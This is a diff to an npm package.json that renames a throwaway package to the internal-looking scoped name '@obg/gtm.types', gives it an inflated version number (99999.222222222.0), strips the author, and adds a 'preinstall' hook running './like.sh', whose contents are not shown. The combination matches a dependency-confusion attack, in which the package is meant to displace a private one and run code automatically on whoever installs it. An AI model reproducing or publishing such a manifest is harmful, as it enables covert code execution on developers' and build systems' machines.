@@ -1,11 +1,13 @@
 {
-  "name": "aktsii-vkusno-i-tochka-kupit-iotrnz0mx",
-  "version": "1.0.0",
-  "description": "aktsii-vkusno-i-tochka-kupit-iotrnz0mx",
+  "name": "@obg/gtm.types",
+  "version": "99999.222222222.0",
+  "description": "",
   "main": "index.js",
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1"
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "./like.sh"
   },
-  "author": "iotrnz0mx",
+  "keywords": [],
+  "author": "",
   "license": "ISC"
 }
